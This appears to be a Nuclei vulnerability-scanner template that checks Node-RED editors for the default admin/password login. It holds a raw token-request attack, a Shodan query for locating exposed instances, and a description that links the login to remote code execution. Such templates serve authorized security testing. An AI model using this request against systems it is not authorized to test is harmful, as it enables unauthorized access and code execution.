http:
- attack: pitchfork
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'access_token":'
    - 'expires_in":'
    - 'token_type":'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - password
    username:
    - admin
  raw:
  - 'POST /auth/token HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded;charset=UTF-8


    client_id=node-red-editor&grant_type=password&scope=&username={{username}}&password={{password}}

    '
id: nodered-default-login
info:
  author: savik
  classification:
    cpe: cpe:2.3:a:nodered:node-red:*:*:*:*:*:*:*:*
  description: 'Allows attacker to log in and execute RCE on the Node-Red panel using
    the default credentials.

    '
  metadata:
    max-request: 1
    product: node-red
    shodan-query: http.favicon.hash:321591353
    vendor: nodered
    verified: true
  name: Node-Red - Default Login
  reference:
  - https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/
  severity: critical
  tags: default-login,node-red,dashboard,vuln
